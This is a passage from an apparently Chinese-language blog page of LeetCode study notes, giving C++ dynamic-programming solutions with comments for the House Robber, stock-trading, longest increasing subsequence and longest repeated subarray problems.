class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    动态规划</span></span><br><span class="line"><span class="comment">    分成两种情况：</span></span><br><span class="line"><span class="comment">        考虑首元素，不考虑尾元素</span></span><br><span class="line"><span class="comment">        考虑尾元素，不考虑首元素 </span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="comment">//不成环-线性打家劫舍</span></span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">pre_rob</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; nums, <span class="keyword">int</span> start, <span class="keyword">int</span> end)</span></span>&#123;</span><br><span class="line">        <span class="comment">//if(end-start==1)</span></span><br><span class="line">          <span class="comment">//  return max;</span></span><br><span class="line">        <span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">dp</span><span class="params">(nums.size()+<span class="number">1</span>,<span class="number">0</span>)</span></span>;</span><br><span class="line">        dp[start] = nums[start];</span><br><span class="line">        dp[start+<span class="number">1</span>] = <span class="built_in">max</span>(nums[start],nums[start+<span class="number">1</span>]);</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=start+<span class="number">2</span>;i&lt;end;i++)&#123;</span><br><span class="line">            dp[i] = <span class="built_in">max</span>(dp[i<span class="number">-1</span>],dp[i<span class="number">-2</span>]+nums[i]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dp[end<span class="number">-1</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//成环-打家劫舍</span></span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">rob</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n = nums.<span class="built_in">size</span>();</span><br><span class="line">        <span class="keyword">if</span>(n==<span class="number">0</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span>(n==<span class="number">1</span>) <span class="keyword">return</span> nums[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">if</span>(n==<span class="number">2</span>) <span class="keyword">return</span> <span class="built_in">max</span>(nums[<span class="number">0</span>],nums[<span class="number">1</span>]);<span class="comment">//新加的，不能同时偷这两个房间</span></span><br><span class="line">        <span class="comment">//考虑首元素，不考虑尾元素</span></span><br><span class="line">        <span class="keyword">int</span> res1 = <span class="built_in">pre_rob</span>(nums,<span class="number">0</span>,n<span class="number">-1</span>);</span><br><span class="line">        <span class="comment">//考虑尾元素，不考虑首元素</span></span><br><span class="line">        <span class="keyword">int</span> res2 = <span class="built_in">pre_rob</span>(nums,<span class="number">1</span>,n);</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">max</span>(res1,res2);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="337-打家劫舍-III"><a href="#337-打家劫舍-III" class="headerlink" title="337 打家劫舍 III"></a>337 打家劫舍 III</h2><p>地区只有一个入口，称之为 root 。<br>除 root 之外，每栋房子有且只有一个“父“房子与之相连。一番侦察之后，聪明的小偷意识到“这个地方的所有<strong>房屋的排列类似于一棵二叉树</strong>”。 如果 两个直接相连的房子在同一天晚上被打劫 ，房屋将自动报警。<br>给定二叉树的 root 。返回 在不触动警报的情况下 ，小偷能够盗取的<strong>最高金额</strong>。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure><h3 id="121-买卖股票的最佳时机——买卖一次"><a href="#121-买卖股票的最佳时机——买卖一次" class="headerlink" title="121 买卖股票的最佳时机——买卖一次"></a>121 买卖股票的最佳时机——买卖一次</h3><p>给定一个数组 prices ，它的第 i 个元素 prices[i] 表示一支<strong>给定股票第 i 天的价格</strong>。<br>你只能选择 某一天 买入这只股票，并选择在 未来的某一个不同的日子 卖出该股票。设计一个算法来<strong>返回你所能获取的最大利润</strong>。<br>如果你不能获取任何利润，返回 0 。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    动态规划</span></span><br><span class="line"><span class="comment">    股票 prices[i]</span></span><br><span class="line"><span class="comment">    dp[i][0] 【持有】当前股票】 能获取的最大利润</span></span><br><span class="line"><span class="comment">    dp[i][1] 【不持有】当前股票】 能获取的最大利润</span></span><br><span class="line"><span class="comment">    “持有”不代表就是当天“买入”！也有可能是昨天就买入了，今天保持持有的状态</span></span><br><span class="line"><span class="comment">    dp[i][0]=max(dp[i-1][0],-prices[i]) 买了</span></span><br><span class="line"><span class="comment">    【买卖一次：买股票肯定是第一次买，所以利润是-prices[i】</span></span><br><span class="line"><span class="comment">    dp[i][1]=max(dp[i-1][1],dp[i-1][0]+prices[i]) 卖了</span></span><br><span class="line"><span class="comment">    dp[0][0]=-prices[0]</span></span><br><span class="line"><span class="comment">    dp[0][1]=0</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">maxProfit</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; prices)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n = prices.<span class="built_in">size</span>();</span><br><span class="line">        vector&lt;vector&lt;<span class="keyword">int</span>&gt;&gt; <span class="built_in">dp</span>(n,vector&lt;<span class="keyword">int</span>&gt;(<span class="number">2</span>,<span class="number">0</span>));</span><br><span class="line">        dp[<span class="number">0</span>][<span class="number">0</span>] = -prices[<span class="number">0</span>];<span class="comment">//今天才持有，花出去prices[0]元</span></span><br><span class="line">        dp[<span class="number">0</span>][<span class="number">1</span>] = <span class="number">0</span>;<span class="comment">//不持有，还是0元</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;n;i++)&#123;</span><br><span class="line">            dp[i][<span class="number">0</span>] = <span class="built_in">max</span>(dp[i<span class="number">-1</span>][<span class="number">0</span>],-prices[i]);</span><br><span class="line">            dp[i][<span class="number">1</span>] = <span class="built_in">max</span>(dp[i<span class="number">-1</span>][<span class="number">1</span>],dp[i<span class="number">-1</span>][<span class="number">0</span>]+prices[i]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dp[n<span class="number">-1</span>][<span class="number">1</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    贪心</span></span><br><span class="line"><span class="comment">    取最左 最小值，取最右 最大值</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">maxProfit</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; prices)</span> </span>&#123;</span><br><span class="line">        <span class="comment">/*int n=prices.size(),ans=0;</span></span><br><span class="line"><span class="comment">        for(int i=0;i&lt;n;i++)&#123;</span></span><br><span class="line"><span class="comment">            for(int j=i+1;j&lt;n;j++)</span></span><br><span class="line"><span class="comment">                ans = max(ans,prices[j]-prices[i]);</span></span><br><span class="line"><span class="comment">        &#125;</span></span><br><span class="line"><span class="comment">        return ans;*/</span></span><br><span class="line">        <span class="keyword">int</span> low=INT_MAX;</span><br><span class="line">        <span class="keyword">int</span> maxProfit = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> price:prices)&#123;</span><br><span class="line">            low = <span class="built_in">min</span>(low,price);</span><br><span class="line">            maxProfit = <span class="built_in">max</span>(maxProfit,price-low);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> maxProfit;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="122-买卖股票的最佳时机-II——买卖多次"><a href="#122-买卖股票的最佳时机-II——买卖多次" class="headerlink" title="122 买卖股票的最佳时机 II——买卖多次"></a>122 买卖股票的最佳时机 II——买卖多次</h3><p>在每一天，你可以决定是否购买和/或出售股票。你在任何时候 最多 只能持有 一股 股票。你也可以先购买，然后在 同一天 出售。</p><p>返回 你能获得的 最大 利润 。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    dp[i][0]=max(dp[i-1][0],dp[i-1][1]-prices[i]) 买了</span></span><br><span class="line"><span class="comment">    【买卖多次：买股票不一定是第一次买，利润应该加上之前不持有的】</span></span><br><span class="line"><span class="comment">    dp[i][1]=max(dp[i-1][1],dp[i-1][0]+prices[i]) 卖了</span></span><br><span class="line"><span class="comment">    dp[0][0]=-prices[0]</span></span><br><span class="line"><span class="comment">    dp[0][1]=0</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">maxProfit</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; prices)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n = prices.<span class="built_in">size</span>();</span><br><span class="line">        vector&lt;vector&lt;<span class="keyword">int</span>&gt;&gt; <span class="built_in">dp</span>(n,vector&lt;<span class="keyword">int</span>&gt;(<span class="number">2</span>,<span class="number">0</span>));</span><br><span class="line">        dp[<span class="number">0</span>][<span class="number">0</span>] = -prices[<span class="number">0</span>];</span><br><span class="line">        dp[<span class="number">0</span>][<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;n;i++)&#123;<span class="comment">//从1开始</span></span><br><span class="line">            dp[i][<span class="number">0</span>] = <span class="built_in">max</span>(dp[i<span class="number">-1</span>][<span class="number">0</span>],dp[i<span class="number">-1</span>][<span class="number">1</span>]-prices[i]);</span><br><span class="line">            dp[i][<span class="number">1</span>] = <span class="built_in">max</span>(dp[i<span class="number">-1</span>][<span class="number">1</span>],dp[i<span class="number">-1</span>][<span class="number">0</span>]+prices[i]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dp[n<span class="number">-1</span>][<span class="number">1</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="123-买卖股票的最佳时机-III——最多买卖两次"><a href="#123-买卖股票的最佳时机-III——最多买卖两次" class="headerlink" title="123 买卖股票的最佳时机 III——最多买卖两次"></a>123 买卖股票的最佳时机 III——最多买卖两次</h3><p>给定一个数组，它的第 i 个元素是一支给定的股票在第 i 天的价格。<br>设计一个算法来计算你所能获取的最大利润。你<strong>最多可以完成 两笔 交易</strong>。<br>注意：你不能同时参与多笔交易（你必须在再次购买前出售掉之前的股票）。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    动态规划</span></span><br><span class="line"><span class="comment">    dp[i][0]不操作</span></span><br><span class="line"><span class="comment">    dp[i][1]第一次【持有】</span></span><br><span class="line"><span class="comment">    dp[i][2]第一次【不持有】</span></span><br><span class="line"><span class="comment">    dp[i][3]第二次【持有】</span></span><br><span class="line"><span class="comment">    dp[i][4]第二次【不持有】</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">maxProfit</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; prices)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n = prices.<span class="built_in">size</span>();</span><br><span class="line">        vector&lt;vector&lt;<span class="keyword">int</span>&gt;&gt; <span class="built_in">dp</span>(n,vector&lt;<span class="keyword">int</span>&gt;(<span class="number">5</span>,<span class="number">0</span>));</span><br><span class="line">        dp[<span class="number">0</span>][<span class="number">0</span>] = <span class="number">0</span>;<span class="comment">//不操作</span></span><br><span class="line">        dp[<span class="number">0</span>][<span class="number">1</span>] = -prices[<span class="number">0</span>]; <span class="comment">//第一天持有</span></span><br><span class="line">        dp[<span class="number">0</span>][<span class="number">2</span>] = <span class="number">0</span>;          <span class="comment">//第一天不持有</span></span><br><span class="line">        dp[<span class="number">0</span>][<span class="number">3</span>] = -prices[<span class="number">0</span>];  <span class="comment">//第二天持有</span></span><br><span class="line">        dp[<span class="number">0</span>][<span class="number">4</span>] = <span class="number">0</span>;           <span class="comment">//第二天不持有</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;n;i++)&#123;</span><br><span class="line">            dp[i][<span class="number">0</span>] = dp[i<span class="number">-1</span>][<span class="number">0</span>];</span><br><span class="line">            dp[i][<span class="number">1</span>] = <span class="built_in">max</span>(dp[i<span class="number">-1</span>][<span class="number">1</span>],dp[i<span class="number">-1</span>][<span class="number">0</span>]-prices[i]);</span><br><span class="line">            dp[i][<span class="number">2</span>] = <span class="built_in">max</span>(dp[i<span class="number">-1</span>][<span class="number">2</span>],dp[i<span class="number">-1</span>][<span class="number">1</span>]+prices[i]);</span><br><span class="line">            dp[i][<span class="number">3</span>] = <span class="built_in">max</span>(dp[i<span class="number">-1</span>][<span class="number">3</span>],dp[i<span class="number">-1</span>][<span class="number">2</span>]-prices[i]);</span><br><span class="line">            dp[i][<span class="number">4</span>] = <span class="built_in">max</span>(dp[i<span class="number">-1</span>][<span class="number">4</span>],dp[i<span class="number">-1</span>][<span class="number">3</span>]+prices[i]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dp[n<span class="number">-1</span>][<span class="number">4</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="188-买卖股票的最佳时机-IV——最多k次买卖"><a href="#188-买卖股票的最佳时机-IV——最多k次买卖" class="headerlink" title="188 买卖股票的最佳时机 IV——最多k次买卖"></a>188 买卖股票的最佳时机 IV——最多k次买卖</h3><p>给你一个整数数组 prices 和一个整数 k ，其中 prices[i] 是某支给定的股票在第 i 天的价格。<br>设计一个算法来计算你所能获取的最大利润。你最多可以完成 k 笔交易。也就是说，你<strong>最多可以买 k 次，卖 k 次</strong>。<br>注意：你不能同时参与多笔交易（你必须在再次购买前出售掉之前的股票）。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    动态规划</span></span><br><span class="line"><span class="comment">    把上一题【最多两次】寻找规律，普遍化即可</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">maxProfit</span><span class="params">(<span class="keyword">int</span> k, vector&lt;<span class="keyword">int</span>&gt;&amp; prices)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n = prices.<span class="built_in">size</span>();</span><br><span class="line">        vector&lt;vector&lt;<span class="keyword">int</span>&gt;&gt; <span class="built_in">dp</span>(n,vector&lt;<span class="keyword">int</span>&gt;(<span class="number">2</span>*k+<span class="number">1</span>,<span class="number">0</span>));</span><br><span class="line">        <span class="comment">//初始化</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">2</span>*k+<span class="number">1</span>;i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(i%<span class="number">2</span>==<span class="number">0</span>)</span><br><span class="line">                dp[<span class="number">0</span>][i] = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                dp[<span class="number">0</span>][i] = -prices[<span class="number">0</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;n;i++)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;<span class="number">2</span>*k+<span class="number">1</span>;j++)&#123;</span><br><span class="line">                <span class="keyword">if</span>(j==<span class="number">0</span>)</span><br><span class="line">                    dp[i][j] = dp[i<span class="number">-1</span>][j];</span><br><span class="line">                <span class="keyword">else</span> <span class="keyword">if</span>(j%<span class="number">2</span>==<span class="number">0</span>)</span><br><span class="line">                    dp[i][j] = <span class="built_in">max</span>(dp[i<span class="number">-1</span>][j],dp[i<span class="number">-1</span>][j<span class="number">-1</span>]+prices[i]);</span><br><span class="line">                <span class="keyword">else</span>   </span><br><span class="line">                    dp[i][j] = <span class="built_in">max</span>(dp[i<span class="number">-1</span>][j],dp[i<span class="number">-1</span>][j<span class="number">-1</span>]-prices[i]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dp[n<span class="number">-1</span>][<span class="number">2</span>*k];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="300-最长递增子序列——非连续-递增"><a href="#300-最长递增子序列——非连续-递增" class="headerlink" title="300 最长递增子序列——非连续+递增"></a>300 最长递增子序列——非连续+递增</h3><p>给你一个整数数组 nums ，找到其中【最长严格递增子序列长度】<br>【<strong>子序列</strong>】：是由数组派生而来的序列，删除（或不删除）数组中的元素而不改变其余元素的顺序。<br>例如，[1,3,5,7] 是数组 [1,3,0,6,4,5,7] 的【递增子序列】。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    动态规划 nums[]</span></span><br><span class="line"><span class="comment">    dp[i] 【包括当前nums[i]】的最长严格递增子序列长度</span></span><br><span class="line"><span class="comment">    初始化：dp[i]=1;（因为至少包含自身nums[i]）如上</span></span><br><span class="line"><span class="comment">    if(nums[i]&gt;nums[j])</span></span><br><span class="line"><span class="comment">        dp[i]=max(dp[j]+1,dp[i]);</span></span><br><span class="line"><span class="comment">    最终的结果应该是dp[]数组中的最大值</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">lengthOfLIS</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n = nums.<span class="built_in">size</span>();</span><br><span class="line">        <span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">dp</span><span class="params">(n,<span class="number">1</span>)</span></span>;<span class="comment">//初始为1</span></span><br><span class="line">        <span class="keyword">int</span> res = dp[<span class="number">0</span>];<span class="comment">//记录最大值</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;n;i++)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;i;j++)&#123;<span class="comment">//从0开始</span></span><br><span class="line">                <span class="keyword">if</span>(nums[i]&gt;nums[j])&#123;</span><br><span class="line">                    dp[i]=<span class="built_in">max</span>(dp[j]+<span class="number">1</span>,dp[i]);</span><br><span class="line">                    res = <span class="built_in">max</span>(res,dp[i]);<span class="comment">//更新最大值</span></span><br><span class="line">                &#125;       </span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="674-最长连续递增序列——连续-递增"><a href="#674-最长连续递增序列——连续-递增" class="headerlink" title="674 最长连续递增序列——连续+递增"></a>674 最长连续递增序列——连续+递增</h3><p>给定一个未经排序的整数数组，找到【最长】且 连续递增的子序列，并返回该序列的长度。<br>例如，[1,6],[2,2,7] 是数组 [0,3,1,6,2,2,7] 的【连续递增子序列】。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    动态规划</span></span><br><span class="line"><span class="comment">    dp[i]【包括当前nums[i]】的最长连续递增序列【最大长度】</span></span><br><span class="line"><span class="comment">    初始化：dp[i]=1;</span></span><br><span class="line"><span class="comment">    if(nums[i]&gt;nums[i-1])</span></span><br><span class="line"><span class="comment">        dp[i]=dp[i-1]+1;</span></span><br><span class="line"><span class="comment">    与上一题的区别：</span></span><br><span class="line"><span class="comment">        上一题由于不要求连续，所以使用变量j从0开始遍历，只要小于就更新dp[i]；</span></span><br><span class="line"><span class="comment">        但本题要求连续，更新dp[i]时只能看其前一位dp[i-1]</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">findLengthOfLCIS</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n = nums.<span class="built_in">size</span>();</span><br><span class="line">        <span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">dp</span><span class="params">(n,<span class="number">1</span>)</span></span>;<span class="comment">//初始化1</span></span><br><span class="line">        <span class="keyword">int</span> res = dp[<span class="number">0</span>];<span class="comment">//记录最大值</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;n;i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(nums[i]&gt;nums[i<span class="number">-1</span>])&#123;</span><br><span class="line">                dp[i]=dp[i<span class="number">-1</span>]+<span class="number">1</span>;</span><br><span class="line">                res = <span class="built_in">max</span>(res,dp[i]);<span class="comment">//更新</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="718-最长重复子数组——连续子序列-无增减要求"><a href="#718-最长重复子数组——连续子序列-无增减要求" class="headerlink" title="718 最长重复子数组——连续子序列(无增减要求)"></a>718 最长重复子数组——连续子序列(无增减要求)</h3><p>给两个整数数组 nums1 和 nums2 ，返回 两个数组中【公共的 、长度最长】的子数组的长度。<br><strong>【子数组】：连续子序列</strong><br>输入：nums1 = [1,2,3,2,1], nums2 = [3,2,1,4,7]<br>输出：3<br>解释：长度最长的公共子数组是 [3,2,1]。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    动态规划</span></span><br><span class="line"><span class="comment">    dp[i][j] 以nums[i-1]结尾 和 以nums[j-1]结尾 的两个数组 的 最长重复子数组长度</span></span><br><span class="line"><span class="comment">    初始化：dp[0][0] dp[i][0] dp[0][j]都是无意义的</span></span><br><span class="line"><span class="comment">    全都初始化为0</span></span><br><span class="line"><span class="comment">    if(nums1[i-1]==nums2[j-1])</span></span><br><span class="line"><span class="comment">        dp[i][j] = dp[i-1][j-1]+1;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">findLength</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; nums1, vector&lt;<span class="keyword">int</span>&gt;&amp; nums2)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> m = nums1.<span class="built_in">size</span>();</span><br><span class="line">        <span class="keyword">int</span> n = nums2.<span class="built_in">size</span>();</span><br><span class="line">        vector&lt;vector&lt;<span class="keyword">int</span>&gt;&gt; <span class="built_in">dp</span>(m+<span class="number">1</span>,vector&lt;<span class="keyword">int</span>&gt;(n+<span class="number">1</span>,<span class="number">0</span>));<span class="comment">//初始0 m+1 n+1</span></span><br><span class="line">        <span class="keyword">int</span> res = <span class="number">0</span>;<span class="comment">//记录最大值</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=m;i++)&#123;<span class="comment">//因为dp[i][j]表示的是以i-1 j-1结尾的</span></span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">1</span>;j&lt;=n;j++)&#123;</span><br><span class="line">                <span class="keyword">if</span>(nums1[i<span class="number">-1</span>]==nums2[j<span class="number">-1</span>])</span><br><span class="line">        